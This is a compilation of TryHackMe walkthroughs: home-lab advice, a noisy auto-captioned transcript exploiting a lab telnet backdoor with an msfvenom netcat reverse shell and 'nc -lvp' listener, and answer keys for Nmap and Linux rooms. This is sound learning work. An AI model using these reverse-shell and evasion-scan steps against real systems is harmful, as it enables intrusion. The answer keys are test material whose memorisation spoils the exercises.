Labs are playgrounds for testing and experimenting, using virtualisation software known as hypervisors to replicate real networks and computing technologies.\nHypervisors are classed as either Type 1 bare-metal or Type 2 applications, for example, VirtualBox, Hyper-V or VMWare Workstation. Do some research to find which suits you, I recommend starting with VirtualBox.\nOffline checklist to track your learning path, become a great hacker and stay on task.\nSince you’re spawning VMs on your host computer, be aware of your hardware limitations such as CPU, RAM and HDD. For a basic attack box, use Kali free with at least a 2 Core CPU, 4GB RAM, and 20GB HDD.\nFrom here on out it’s up to you, see CyberWox Home Lab or da667’s Building a Virtual Lab which covers pfSense free, Security Onion free eval, Ubuntu Desktop free, Kali free, Windows Server free eval, Windows Desktop free eval, Splunk free dev and VulnHub machines free. Requires 8 core CPU, 16Gb RAM and 500Gb HDD.\nIt’s good if you can have a dedicated lab system like an old laptop or gaming PC, for more, see Guide To Homelabbing. If you’ve never built a computer before, it’s a great practice to buy parts yourself and assemble them, for help see How To Build A PC.\nCommunity In order to stay focused while learning, not to mention keeping up to date with the ever-changing field that is Cyber Sec, find some good communities.\nThese are the guys and gals out there, other students on the same path or experts who have been in the field for years.

For help getting started, see Linux Quick Start Guide and Starting Out In Cyber Security.\nHello, welcome back.\nWe are going to be doing some morenetwork services on try hack me.\nSo there’s going to be a walkthrough.\nWe’re up to task five,understanding telnet.\nAnd I just need to tell you that there isa written right up below if you look\nin the description and timestampsare going to be in the video.\nSo if you just wantto jump along, go for it.\nOkay, with that out of the way, let’s gothrough task five, understanding telnet.\nIf you haven’t already,\nstart your virtual machinethat we’re going to be looking into.\nAnd as always, I’m sort of justgoing to go over the info roughly.\nI’m not going to go into everything,but what is telnet?\nTelnet is an application protocol\nwhich allows you to usewith the use of telnet client.\nWow, great start.\nTo connect to and execute commands\non a remote machine that ishosting a telnet server.\nSo application protocol,so replacement, it’s been getting replaced\nby SSH because everything’sin clear text or plain text.\nSo you’re not going to see telenet,which is kind of funny because I did\nactually see it in my routeror my old router.\nGood thing I don’t have that anymore.\nHow does telnet work?\nSo the user connects to the server\nby using the telnet protocol, which meansentering telnet into a command prompt.\nThe user then execute commands\non the server by specific telnetcommands in the telnet prompt.\nSo we need to go from our shellinto telnet terminal or prompt shell.\nYou can’t connect to a telnetserver with the following syntax.\nCool.Okay, so what is telnet?\nSo telnet is an application protocol.\nWhat has slowly replaced telenet?\nSo that is SSH.\nSo you’ve probably done a bit of SSH\nalready connecting to the virtualmachines, intra hacking.\nHow do you connect to a telnet serverwith the IP of three on the port 23.\nSo we store here telnet,that should be as easy as going, hey,\nwe want to connect to telnet, we wantto use this and we want to go to port 23.\nAnd the lack of what means that alltelnet communication is in plain text.\nSo it did allude to up here that it’sall in just clear text or plain text.\nSo if we look at our hint, what does\nthe modern intent use useto communicate securely?\nSo we can think about SSL and Https.\nAll of these formsof communications encrypt our data.\nSo there’s just no encryption on telenet.\nSo any protocol that usesplain text or is not cool.\nSo yeah, encryption, we want encryption.\nWe want our data to be alljangled up and confused.\nSo if anybody sees it,they can’t understand it.\nCool.\nSo task six enumerating telnet.\nSo let’s get started before we begin,make sure to deploy the room.\nSo I’ve done that.\nSo I’ve got my IP up here.\nYours is going to bea little bit different.\nWe’ve already seen how key enumeration canbe how key enumeration can be\nin exploiting a misconfigurednetwork service.\nHowever, vulnerabilities that could be\npotentially trivial to exploitdon’t always jump out at us, man.\nThis is something that keeps coming up\nfor me because when we run, like, scansand stuff, it’s just like a wall of text.\nI find it really hard to siphon through.\nI don’t know if it’s the same for you,but yeah, this really resonates with me.\nSo for that reason,especially when it comes to numerating\nnetwork services, we need to be thoroughin our method, which I’m learning.\nPort scan.Let’s start out the same way as we usually\ndo a port scan,to find out as much information as we can\nabout the services application structureand OS for the target machine.\nNmap going to use Nmap.\nSo first question here is how manyports are open on the target machine?\nOkay, so we’re just going to runan MMAP scan against our target.\nBut we do want to adda couple of switches here.\nSo some of the switches that I’m learning\nis like double BV for both sowe can see the information.\nThe other one that I forgetis outputting it into a file.\nSo we can output into scan ports.\nWe can just output that into a file.\nBut I’ve also learned if we Tea this outso this is a pipe command at the end.\nSo we’re going to pipe the output of this\nthrough another command called T, which isgoing to put it into another file.\nAnd I’m just going to makethis a backup file.\nThe reason for this is I have learned\nfrom my short time doing this is this isgreat to get your final results\nof the scan using the O Noutput to a normal file.\nBut just in case I cancel the scan or\nsomething, this won’t actuallyrun until it’s finished.\nSo if we just tee out the results,you’re going to get everything.\nSo it’s good.\nJust have a backup fileor just not do this part and only do T?\nWhatever.\nI really like using PN for ping,but I don’t know if that’s going to work.\nAlso,we don’t want to set aside ports just yet,\nbut I’m going to speedit up using T three.\nSo T one to five is how fast it can go.\nSo I’m just going to use T three.\nI think that’s fine.\nLet’s just see what we get.\nOkay, so our port scan hasfinished and we’ve got an 80 one.\nThat’s the only thing openout of all 65,535 ports.\nJust this one.\nAnd this is what theycall a nonstandard port.\nSo let’s go over these.How many ports?\nSo we just got the one.\nWhat port is this?\nSo it’s on TCP, it’s openand we’ve got TTL.\nSo we know that it’s Tal net,but it’s actually asking us for the exact\nnumber, which I thoughtit wasn’t for a second.\nThis port is undecided but stilllists the protocol it’s using.\nSo what protocol is this?\nSo it’s on TCP.\nSo transmission, communication.\nCommunication protocol.\nYeah, I think those weresimple stands for now.\nLet’s rerun it.So we’ve already done it with p to get\neverything so we don’tneed to run anything.\nIt says how many ports show up as open.Nothing.\nThere’s nothing else.Everything else is closed by this one.\nSo that’s why we want to run that.\nAnd that’s good.\nSo don’t be like me and get trippedout when we don’t see anything.\nYeah.\nBased on the title returned to us, whatdo we think this port could be used for?\nSomething.A something.\nSo this is some sort of communication.\nWe know it’s going to be telnetbut like a service.\nAre we looking for a service?\nBased on the title return to us, what dowe think this port could be used for?\nCommunication.\nWho could be long to gathering possibleusernames as is an important step.\nSorry.Did I miss something?\nIt’s important to try everynew range you gather here.\nThe exploitation stage.\nBased on the title return to us.\nSo what have we got from this so far?\nWe’re not running anythingelse at this point.\nI know what I need to do.\nI know what I need to do.\nSo I need to actuallyspecify against port.\nSo we’re going to actually just go\nwhat happens 80 two?\nBecause that’s the port we’re goingto do another 18012 this time.\nWe’re just goingto aggressively look at port.\n80120n earth is just happening right now.\nWhat’s the actual watt?\nOkay, don’t know whatthat was but we’re good.\nWe’re good.We’re good.\nI’m going to calm down the speed.\nSo let’s just run this against isone port to get more information.\nThat’s what was tripping me.\nI haven’t further enumerated using nmap I\nwasn’t supposed to useanother actual program.\nSupposed to be properly enumeratedhow good I am at this.\nAnyway.\nI will understand cybersecurityand penetration testing.\nSo we’re going to let this ride run.\nThe last one took a while.\nSo unmarked.\nGo ahead and pause againfor this to finish.\nAll right,\nso we have got our scan completed,this time using the dasha for aggressive\nand all trying have used the NSE orNmap Cert scan engine, script engine.\nAnd we found something under here.\nSo this is what I was missingearlier, a back door.\nSo there’s something placedhere to connect back to.\nSo in this case, the usernamewe can assume might be Skitty.\nAlways keep a note of information you find\nduring your installation so you canrefer back to further exploits.\nAbsolutely.\nSo if we list out everything, so I’ve got\nthe whole scan portand then I’ve got the 812.\nSo if I ever need to, we can goand use 812 and get this scan back.\nSo always have the backup or just files.Awesome.\nOkay, so let’s go over to exploiting now.\nSo, types of telenet exploit.\nTypes of telnet exploit.\nTelnet being a protocol is in itself\ninsecure for the reasonswe talked about earlier.\nPlain text, no encryption.\nSo it sends everything pretty much.\nAnd there are CVE,can’t remember the CVE,\nbut basically known vulnerabilitiesfor telnet clients and service systems.\nSo we can look up here and here.Cool.\nSo common vulnerabilities and exposures.\nGot to try and remember that one.\nCommon vulnerabilities and exposures.\nIt’s a list of publicly disclosedcomputer security flaws.\nSo when someone refers to a CVE,\nthey usually mean the CVE ID numberassigned to that security floor.\nKnown vulnerabilities.\nOkay, so method breakdown.\nSo from our new numeration stage,\nwe know there is a poorly hidden telnetservice running on this machine.\nThe service itself is marked asa backdoor we possibly use, named Skitty.\nSo connecting to telenet,\nwe can use the telnet that we hadspecified on the port that we know.\nSo from the earlier\nit was 23 as an example,but in this case, we’re using 80, 112.\nSo that’s the port that we’re usingto connect over to this machine.\nAnd we’re going to be using the IP.\nSo we have got a connection, skis backdoor type help to see what we can do.\nWe can go run command,but I don’t know any commands.\nSo this is at least where we cando some sort of reverse shell.\nSo reverse shell’sconcept of getting the machine to send\nback a shell to our machinethat will be listening.\nSo we can see here, victim connectsto an attacker on a listening port.\nSo we can try and executesome sort of reverse shell.\nHonestly, I’m still gettingmy head around reverse shells.\nAnd the other type of shell that’s common,which I can’t remember the name of.\nAll right, let’s try and connectto the telnet port, which we just did.\nSo great, it’s open.Telnet communication.\nWhat message do we receive?\nSo we’ve got Skitty’s backdoor type help.\nI think it just wants that.\nCool, let’s try and execute some commands.\nDo we get a return on any inputwe enter into the telnet session.\nI mean, I do get a return from help,\nbut if I try and run anything,I do get something from help.\nBut if I try and runanything, no, I don’t.\nSo the answer is no.\nObviously.That’s strange.\nLet’s check to see if what we’re typingis being executed as a system command.\nSo let’s start a TCP listeneron the local machine.\nI’m going to go control shiftR to get a terminal up here.\nI don’t know why this trips out.\nThe fonts really annoying.\nSo we want to go T-C-P-D-U-M-P-I-P pro\ntoontontunnel.\nSo this is going to be listeningto anything that comes over.\nThis is like the only timeI’ve actually used TCP dump.\nSo let’s try and go help again.\nDo we see anything run?\nNo, that’s not going to do anything\nbecause we want to see a specificlistening for ICMP traffic.\nRight.So now we can use the command ping local.\nSo if we go run ping\nand I’m not going to remember theconfig, just get our local IP here.\nCool.\nSo we saw that ping request.\nSo we do need to interact.\nSo we can actually exit things.\nI just need to know the commands to run.\nSo now use the commands.\nOkay, I’m understanding.\nYes, we can see something.Great.\nThis means that we’re able to execute\nsystem commands and that we’re ableto reach out to a local machine.\nSo we’re going to generate a reverseshell payload using SF venom.\nThis will generate encodenetcat reverse shell for us.\nHere’s our syntax.Cool.\nSo we need to do thison our local machine.\nSo I’m just going to go over a new shell.\nSo if we run this command\nbut we’re going to edit it just toput our local IP in here,\nwhich I have forgotten againand I will never remember.\nI see how people do likevariables and they put their IP and I\nthink I should reallylearn how to do that.\nThis is a part of the metasploit frameworkand they made it a standalone pool tool.\nAnd we’re using the P for payload.\nAnd then this is a builtin payload that we can use.\nSo I’m just learning MSF.Venom.\nSo we set our listener host to this,which is us.\nSo we’re going to try and\ntell the machine, hey,connect back to us on this port.\nFour, four, four.\nSo we then have our payload,which is this.\nSo this is going to tell the machine usingthis command to set up netcat and to\nsend this connection back to us,which is kind of crazy.\nSo we can go run paste that in there.\nAnd I’m not going to hit enter.\nBecause if we hit enter and we’re not\nlistening, then we’re notgoing to actually hear it.\nSo we just want to set up Lon netcat so NC for netcat L forbos.\nAnd I think that’s something aboutDNS don’t Rename can’t remember.\nAnd then P.\nSo we don’t want to do 123-7144 four\nbecause we set it to talkback over that port.\nWe could set any port.\nIt doesn’t matter the actualnumber that we set.\nSo if I go back here and we hit enter\nand we go back here,we now have a connection.\nSo before it was just listening and it\nsaid connect to from unknown,and we have some sort of non interactive\nshell, meaning we don’thave the nice prompts.\nBut if we go like, who am I?\nBecause confidently we know that it is\nrunning some sort of Ubuntu,Unix or Linux system.\nSo we can run.\nWho am I?\nPrint working directory.\nSo we’re in root and we can list outwhat’s here and we can cut out our flag.\nWow, sick.\nSo let’s just go back here becauseI did go ahead a little bit.\nWhat does the generatedpayload start with?\nStarted with this.\nI don’t know what that command does.\nWhat would the command look liketo set up our listening port?\nSo netcatlvp I did the end,but it doesn’t matter.\nAnd then listening port.\nYeah, great.\nNow we run that and do everything that I\ndid, and we get this and we cancheck that in there and we’re done.\nSick.That was awesome.\nSo that was our three tasksfor telnet in our network services.\nI hope you enjoyed,I hope you learned something.\nI had a couple of troubles here and therewith my end map scan, and that’s fine.\nIt’s part of learning.\nSo we can go aheadand turn off that machine.\nSo if you want to stick around,\nI’m going to go ahead and getinto the FTP see in the next video.\nSo if you want to do that,that sounds cool.\nIf not, all good.\nLet me know what you enjoyed about\nthe video if you want to,otherwise I will see you in the next one.\nCool, bye.\nNmap is a powerful tool to enumerate computer systems, meaning, it can find out information about a target. But as you’ll learn from this room, Nmap can do even more!\nOffline checklist to track your learning path, become a great hacker and stay on task.\n‘What networking constructs are used to direct traffic to the right application on a server?’ – they’re numbers, starts with p. ‘How many of these are available on any network-enabled computer?’ – make sure to search ‘Computer Networking Ports’ for more help. ‘[Research] How many of these are considered “well-known”? (These are the “standard” numbers mentioned in the task)’ – searching will also help with this question too, don’t forget to count 0… no it’s not 1023. Task 3 Nmap Switches Alright, next up, let’s learn about the various settings we can turn on and off, aka switches. Nmap has a lot of switches, so don’t feel discouraged if you can’t remember them all, it takes time. Don’t forget to read the man pages for nmap when you get stuck.\n‘What is the first switch listed in the help menu for a ‘Syn Scan’ (more on this later!)?’ -sS ‘Which switch would you use for a “UDP scan”?’ -sU ‘If you wanted to detect which operating system the target is running on, which switch would you use?’ -O ‘Nmap provides a switch to detect the version of the services running on the target. What is this switch?’ -sV ‘The default output provided by nmap often does not provide enough information for a pentester. How would you increase the verbosity?’ -v ‘Verbosity level one is good, but verbosity level two is better! How would you set the verbosity level to two? (Note: it’s highly advisable to always use at least this option)’ -vv ‘What switch would you use to save the nmap results in three major formats?’ -oA ‘What switch would you use to save the nmap results in a “normal” format?’ -oN ‘A very useful output format: how would you save results in a “grepable” format?’ -oG ‘How would you activate this setting?’ -A ‘How would you set the timing template to level 5?’ -T5 ‘How would you tell nmap to only scan port 80?’ -p 80 ‘How would you tell nmap to scan ports 1000-1500?’ -p 1000-1500 ‘How would you tell nmap to scan all ports?’ -p- ‘How would you activate a script from the nmap scripting library (lots more on this later!)?’ --script ‘How would you activate all of the scripts in the “vuln” category?’ --script=vuln Task 5 Scan Types TCP Connect Scans Ah, TCP Scans, the default for nmap without root privs, make sure to go over the three-way handshake from the info provided. Let’s answer the questions:\n‘Which RFC defines the appropriate behaviour for the TCP protocol?’ – RFC 793 ‘If a port is closed, which flag should the server send back to indicate this?’ – RST Task 6 Scan Types SYN Scans Cool, now SYN Scans, the default for nmap WITH root privs, let’s see the questions:\n‘There are two other names for a SYN scan, what are they?’ – Half-Open, Stealth ‘Can Nmap use a SYN scan without Sudo permissions (Y/N)?’ – N Task 7 Scan Types UDP Scans Lastly out of the main three scans, UDP, I’m still yet to really use this scan, but good to keep in the bank for later. Let’s see the questions:\n‘If a UDP port doesn’t respond to an Nmap scan, what will it be marked as?’ – open|filtered ‘When a UDP port is closed, by convention the target should send back a “port unreachable” message. Which protocol would it use to do so?’ – ICMP Task 8 Scan Types NULL, FIN and Xmas Next up is the lesser scans, ideally for firewall evasion as they’re a bit more complicated. After you read the info provided, here’s a look into the questions and answers:\n‘Which of the three shown scan types uses the URG flag?’ – xmas ‘Why are NULL, FIN and Xmas scans generally used?’ – Firewall Evasion ‘Which common OS may respond to a NULL, FIN or Xmas scan with a RST for every port?’ – Microsoft Windows Task 9 Scan Types ICMP Network Scanning Ping sweeping, this is really good to remember! This is how you can find multiple hosts across a network, and fast. Use the -sn switch to enable it, and use arguments that specify the ip range and scope, see below for more. Don’t forget to run nmap’s help switch through grep to find the ping scan switch.\n‘How would you perform a ping sweep on the 172.16.x.x network (Netmask: 255.255.0.0) using Nmap? (CIDR notation)’ – nmap -sn 172.16.0.0/16 Task 10 NSE Scripts Overview Scripts blow open nmap into a whole another level, some scripts go beyond enum into exploiting vulns, crazy. After going over the tasks, let’s tackle the questions:\n‘What language are NSE scripts written in?’ – Lua ‘Which category of scripts would be a very bad idea to run in a production environment?’ – intrusive Task 11 NSE Scripts Working with the NSE Great, use the --script-help switch to find a script’s help info, then go to the info page for more.\n‘What optional argument can the ftp-anon.nse script take?’ – maxlist Task 12 NSE Scripts Searching for Scripts Learning nmap can be a bit tricky, now about the programs within the program, like I mentioned before, whole other level. Make sure to read all the info provided, take your time.\nYou can display Nmap’s database text file and search it using grep for “anon” as an example.\n‘Search for “smb” scripts in the /usr/share/nmap/scripts/ directory using either of the demonstrated methods. What is the filename of the script which determines the underlying OS of the SMB server?’ – smb-os-discovery.nse ‘Read through this script. What does it depend on?’ – smb-brute Task 13 Firewall Evasion Now this may ring a bell, we’ve already touched on firewall evasion back in task 8, go back up if you need a quick refresher, I’ll wait. Search nmap’s help again, this time search for “append”.\n‘Which simple (and frequently relied upon) protocol is often blocked, requiring the use of the -Pn switch?’ – ICMP ‘[Research] Which Nmap switch allows you to append an arbitrary length of random data to the end of packets?’ – --data-length Task 14 Practical Great, now you’re nearly at the end of the room, just the last practical nmap task. Use a Xmas scan, don’t forget to use the -vv to see talkative nmap results.\n‘Does the target \u0026lt;ip\u0026gt; respond to ICMP (ping) requests (Y/N)?’ – N ‘Perform an Xmas scan on the first 999 ports of the target — how many ports are shown to be open or filtered?’ – 999 ‘There is a reason given for this — what is it? Note: The answer will be in your scan results. Think carefully about which switches to use — and read the hint before asking for help!’ – No Response. ‘Perform a TCP SYN scan on the first 5000 ports of the target — how many ports are shown to be open?’ – 5. ‘Deploy the ftp-anon script against the box. Can Nmap login successfully to the FTP server on port 21? (Y/N)’ – Y. Great work, that’s the Nmap Room from TryHackMe, I hope you enjoyed it!

Did you forget to take notes? I got you covered. Here are my Nmap room notes from TryHackMe, use them as much as you need!\nDisclaimer, this is written in shorthand format, meaning, full sentences and proper grammar are always not used. For a full writeup, see TryHackMe Nmap Walkthrough, for help with Linux, see Quick Start Guide.\nTask 1 Deploy \u0026amp; Task 2 Introduction Ports: allow multiple network services, ensure correct device communication, 65535 total.\nNetwork connections between two ports: one open on server, one, high-numbered opens randomly on device. Port scanning: shows services running on target, “landscape”, nmap tool is used. Types of ports: (example standard ports: 443 HTTPS, 80 HTTP, 139 Win NETBIOS, SMB 445). Well-known: 0-1023. Registered: 1024 to 49151. Dynamic/private: 49152 to 65535. Port states: open, closed, or filtered (from firewall). Task 3 Nmap Switches Types of scans/switches:\n-sS TCP SYN. -sU UDP Scan. -O operating system. -sV version. -v or -vv increase verbosity. -oA output 3 major formats. -oN output normal format. -oG output grepable format. -A aggressive mode: services, OSs, traceroute, scripts. -T\u0026lt;0-5\u0026gt; timing, higher is faster. -p scan only specific port e.g. -p 80, -p 1000-1500 -p- scan all ports. --script use script e.g. --script=vuln Scan Types – Task 4 Overview, Task 5 TCP Connect, Task 6 SYN, Task 7 UDP, Task 8 NULL, FIN and Xmas, Task 9 ICMP Network Scanning Basic scan types:\n-sT TCP Connect: uses three-way handshake SYN \u0026gt; SYN/ACK \u0026gt; ACK – default without sudo priv. If port closed SYN \u0026gt; RST reset, If firewall SYN \u0026gt; blank/filtered/dropped. -sS SYN (half-open/stealth): SYN \u0026gt; SYN/ACK \u0026gt; RST – default with sudo priv. Benefits: avoids older detections, often not logged, slightly faster. Cons: sudo/root/admin privs, some services can brought down. -sU UDP: stateless connection, difficult/slower to scan. Should be no response, assumed open, marked open/filtered, moves on. If closed, should receive ICMP (ping) packet. Less common scan types: used for firewall evasion.\n-sN TCP Null: sends empty packet, no SYN flag. -sF TCP Fin: sends almost empty packet, only FIN flag, used to close active connection. -sX TCP Xmas: sends URG (Urgent), PUSH, and FIN flags, looks like chirstmas tree in wireshark. ICMP Network Scanning: find map/landscape, scans any port\n-sn \u0026lt;ip range\u0026gt; find up/down hosts e.g. 192.168.0.1-254 or 192.168.0.0/24 Forces ICMP or ARP (local networks).

Great, me too!\nHere’s the Linux Fundamentals 1 Walkthrough from TryHackMe. Let’s take a look at some of the fundamentals of Linux including common commands, the terminal, your prompt and more. There’s lots to love in Linux, as there’s so many flavours or distributions, the possibilities are endless.\nI hope you learn something on your Linux journey! Enjoy TryHcakMe’s Linux Fundamentals 1.\nDisclaimer, for more TryHackMe walkthroughs, see Linux Fundamentals 2 or Linux Fundamentals 3. For more Linux, see the blog and the Linux Quick Start Guide.\nTask 1, 2 and 3 To get started, just read each level and click next once you’ve understood the tasks and content. First up, to answer, what year was the first release of a Linux operating system? Use Wiki to find the first flag, 199*, great work!\nBefore we go any further, let’s connect using OpenVPN to TryHackMe’s virtual private network. Download your OpenVPN config file, then use sudo openvpn /path/to/file/username.ovpn to start the connection.\nOnce connected, you can ssh into the machine to log in as the user to complete the other levels. Do this using ssh tryhackme@\u0026lt;ip address\u0026gt;, don’t forget both username and password are both tryhackme.\nTask 4 Running Your First few Commands Alright, now let’s get familiar with the terminal and use your first few commands, echo and whoami. Start with either one and use the screenshot below to assist you.\nIt’s recommended to type the commands, again and again, to get your muscle memory engaged. The more you type, the faster you get and the better you’ll be at using the commands you learn.\nOnce you’re comfortable with those commands, tackle the questions in this level/task.\nTo answer, ‘If we wanted to output the text “TryHackMe”, what would our command be?’ use the following echo T**H***M*. And for ‘What is the username of who you’re logged in as on your deployed Linux machine?’ use the whoami command.\nNice work!\nTask 5 Interacting With the Filesystem! Nice, let’s keep going with a few more commands we need to navigate the filesystem. To explain, the filesystem is all the folders and files that are preconfigured and used by you the user and Linux itself.\nStart with using the ls command to list out the contents of the current directory, and try adding -l and -la after to see how the one command can be used in different ways. More on these later.\nNext, start using cd for Change Directories, the term directory can be likened to a folder, its something that stores files inside it. You can use cd \u0026lt;location\u0026gt; for example to get to the topmost folder, or root, use cd /. The forward slash is used in file paths to determine the location, but the topmost level only has / as there’s no other directories above it.\nIf you get lost, use the ~ to get home, that’s the symbol for your logged-in users home directory, so to do that, use cd ~. Also, you can manually get there by cd /home/\u0026lt;username\u0026gt;.\nYou can also use Print Working Directory to check where you are, so that’s pwd. Your prompt in modern Terminal Emulator Shells like BASH can include pwd and whoami at any given time which is a nice feature to have.\nGood work so far, let’s take on the task questions for 5.\n‘On the Linux machine that you deploy, how many folders are there?’ – use the ls command. ‘Which directory contains a file?’ – you can ls folder\u0026lt;1,2,3,4\u0026gt;/ to see the contents. ‘What is the contents of this file?’ – use cat to concatentate/display the files contents. ‘Use the cd command to navigate to this file and find out the new current working directory. What is the path?’ – try use pwd for this, but make sure you’ve cd folder4/ first. Task 6 Searching for Files Good work so far!\nAnother program/command called grep which can search through the contents of a file.\nFor this level’s question, ‘Use grep on “access.log” to find the flag that has a prefix of “THM”. What is the flag?’ follow the screenshot below.\nTask 7 An Introduction to Shell Operators Almost there, let’s talk Shell Operators, symbols that make our lives easier!\nTry it out using the echo command like so, echo hey \u0026gt; welcome and then cat welcome. Cool hey? We can send the outputs of a command to another destination rather than just the terminal’s output on the screen.\nLet’s do the last set of questions for this room.\n“If we wanted to run a command in the background, what operator would we want to use?’ – you’ve got a few options, go over the operators again if you’re unsure. ‘If I wanted to replace the contents of a file named “passwords” with the word “password123”, what would my command be?’ – see the screenshot for help below. ‘Now if I wanted to add “tryhackme” to this file named “passwords” but also keep “passwords123”, what would my command be’ – same again, see screenthot. Well done, that’s it! You passed all the levels in the room!\nGreat work for making it to the end of TryHackMe’s Linux Fundamentals 1 Room.

Welcome aboard!\nHere’s the Linux Fundamentals 2 Walkthrough from TryHackMe. Let’s take a look at some of the fundamentals of Linux including some more commands, ssh, bash scripting and more.\nThere’s lots to love in Linux, I hope you learn something here on your Linux journey! Enjoy TryHackMe’s Linux Fundamentals 2.\nDisclaimer, for more, see Linux Fundamentals 1, Linux Fundamentals 3 and Linux Quick Start Guide. Check out the video guide too:\nTask 1 and Task 2 Accessing Your Linux Machine Using SSH To get started, make sure you’re connected to the TryHackMe VPN. If you’d like to automate this, you can create a small bash script.\nCreate a new file using a text editor, more on this soon, use nano tryhackme-openvpn and use the following text and see the screenshot below for help.\n#!/bin/bash sudo openvpn /file/path/\u0026lt;username\u0026gt;/Downloads/\u0026lt;your file\u0026gt;.ovpn Nice, you’ll just have to make the bash script executable using chmod +x \u0026lt;file name\u0026gt;.ovpn and hit enter. Running ls -l will show you the difference in permissions, see screenshot below.\nGreat work, the last step is to ssh into the Virtual Machin (VM) and you’re good to go!\nThink about it like, OpenVPN has connected you to the TryHackMe network, and then SSH is letting you log in as a user on that network, pretty cool. See the screenshot below for more.\nTask 3 Introduction to Flags and Switches Now it’s time for switches, these are like settings or options you can turn on by using a - followed by either a lowercase, uppercase or phrase.\nSwitches might seem weird at first, but think about how many settings are in your web browser for example. They’re all behind a settings menu, image if you could access any setting with just a single letter, kinda powerful stuff. Sure, you just need to learn the switches, but once you know them, it’s much faster than accessing setting menus every time.\nTry using the ls command again, but add the switches in the screenshot below.\nTo learn what switches do what, you can either run the manual page for the command like man ls or ls --help sometimes commands allow -h too.\nLet’s go over the task questions:\n‘What directional arrow key would we use to navigate down the manual page?’ – to explain, the arrow keys act like the scroll wheel on your mouse, you can cycle through your used commands. Up goes up, so down must go…? ‘What flag would we use to display the output in a “human-readable” way?’ – so you can mannually search through the help output, but a easier way is to search through it automatically. You can do this use ls --help | grep \u0026quot;human\u0026quot; this ‘pipes’ the output from ls --help through grep allowing you to search the contents against \u0026quot;human\u0026quot;, pretty cool hey? See below for an example. Task 4 Filesystem Interaction Continued Awesome, more filesystem commands, let’s go! You can go ahead and just make new files using touch \u0026lt;file name\u0026gt; and for folders/directories you can use mkdir \u0026lt;dir name\u0026gt;.\nTo delete, use the rm command, just be careful to note remove the wrong files or directories, see screenshot below.\nTo copy, use the cp command, see screenshots.\nTo move, use the mv command.\nAnd if you want to know what type of file a file is, just run the file command against it.\nNice, let’s go over the tasks questions:\n‘How would you create the file named “newnote”?’ – you can do this is a few ways, but for this task, use the touch command. ‘On the deployable machine, what is the file type of “unknown1” in “tryhackme’s” home directory?’ – run the file command agasint it to find out. ‘How would we move the file “myfile” to the directory “myfolder”’ – remember, use the move command like this mv \u0026lt;old directory\u0026gt; \u0026lt;new directory\u0026gt;. ‘What are the contents of this file?’ – you can use the cat command for this one. Task 5 Permissions 101 \u0026amp; Task 6 Common Directories Ah, permissions, it’s very daunting at first, but there’s a method to the madness.\nUse the ls -l to see the permissions for the current directories files. You’ll see either a -, r, w or an x – these stand for read, write and execute. Read means you can see it, write means you can edit it, and execute means you can run it.\nTo switch users, use the su command, but to run an application as another user without switching, use sudo. Note, the sudo command’s default behaviour runs as root, this is commonly used to allow full authenticated behaviour on a system.\nOkay, time for this tasks questions:\n‘On the deployable machine, who is the owner of “important”?’ – using ls -l see the column showing usernames. ‘What would the command be to switch to the user “user2”?’ – su is the command, but how do you switch to user2? ‘Output the contents of “important”, what is the flag?’ – once you switch users, use the cat command to display the important files output. Next up is Task 6, let’s go straight to the task questions:\n‘What is the directory path that would we expect logs to be stored in?’ – the /var has variable data like logs. ‘What root directory is similar to how RAM on a computer works?’ – RAM is volitale, meaning it’s deleted after a system shut down or reboot, similar to a temporary directory. ‘Name the home directory of the root user’ – it’s the same name as the user itself.

What is the flag?’ – you could just cat out the file, but in this case, use nano \u0026lt;file name\u0026gt; to practice it. Task 4 General/Useful Utilities If we’re using a terminal, there’s no nice web browser to navigate to a website and download our fav HD wallpaper pack, so how do we download?

Note, the system we’re logged in to already has the file, but it’s only accessible for the root user, so this is a nice way to download it to get access, keep this in mind for future rooms.\nGreat, now let’s download the hidden file via web server using wget http://\u0026lt;ip address\u0026gt;:8000/.flag.txt see the screenshot below for help.\nThen it’s a case of using cat… and after many attempts (for me), see the contents of the downloaded flag file, see screenshot below. This will help you with the ‘What are the contents?’ question.\nTask 5 Processes 101 Next up we’ve got processes. To explain, a program that is in the state of running is known as a process, it’s in the ‘process’ of running. Use the ps to see current processes on your system from your logged-in user.\nThen use ps aux to see processes from other users.\nNow try using top to see the live state of processes, this is much more like running Task Manager in a Windows Desktop environment.\nSo cool, you can see processes running on your system, but how do you stop one?\nLet’s do a little test, run nc -lp 1337, this start’s a listening command called netcat and then find the PID via ps and then using the kill command to stop it.\nCool right? The PID is a unique numeric value for each process, if you find the PID, you can kill the process.\nNext, let’s run the echo command and output it in the background using the \u0026amp; operator. Once you do that, then run the fg command which brings anything you’ve put in the background, to the foreground. If you put multiple commands to the background, you can us fg \u0026lt;1,2,3 etc\u0026gt; to get the command back, it goes in order of when it was put in the background.\nNice work, let’s see the task questions:\n‘If we were to launch a process where the previous ID was “300”, what would the ID of this new process be?’ – in the example given, a processes PID with 60, the next process would be 61. ‘If we wanted to cleanly kill a process, what signal would we send it?’ – it’s not kill, it’s something that would “do some cleanup tasks beforehand”. ‘Locate the process that is running on the deployed instance (YOUR_MACHINE_IP). What flag is given?’ – see the screenshot below for more help one this one, you can grep out the results to help searching. ‘What command would we use to stop the service “myservice”?’ – using the systemctl command against myservice … you could use, stop? ‘What command would we use to start the same service on the boot-up of the system?’ – you could use the same as the previous question, but enable? ‘What command would we use to bring a previously backgrounded process back to the foreground?’ – fg for sure. Passing, or piping the output from ps aux into grep to find the flag.\nTask 6 Maintaining Your System: Automation Ah, crontabs, automating our system, crons are such a powerful tool, let’s have a look at it all in a bit of detail. You can explore crontabs using the crontab -e command and switch to open the crontab file to see automated tasks.\nOkay, the task questions:\n‘When will the crontab on the deployed instance (MACHINE_IP) run?’ – using crontab -e and the arrows keys to navigate the file, there’s one entery in the crontab config file, but what time will it be deployed? @******… Note, Task 7 is just a read task, not questions or flags to discuss, but make sure you go over it!\nTask 8 Maintaining Your System: Logs \u0026amp; Outro Okay, system logs, also known as variable data. Remember from last Linux Fundamentals room, this type of data is held in the /var/log directory. Use the cd command to navigate there and ls -la to see what’s in the location.\nTo access the access.log.1 file and find ip of a user and the file that was accessed, you can use the cat command. This will help you with the questions ‘What is the IP address of the user who visited the site?’ and ‘What file did they access?’\nWell done, that’s it for the Linux Fundamentals 3 Room from TryHackMe, you did it!\nI hope you’ve learnt a lot and are feeling comfortable with the terminal and command-line interface.

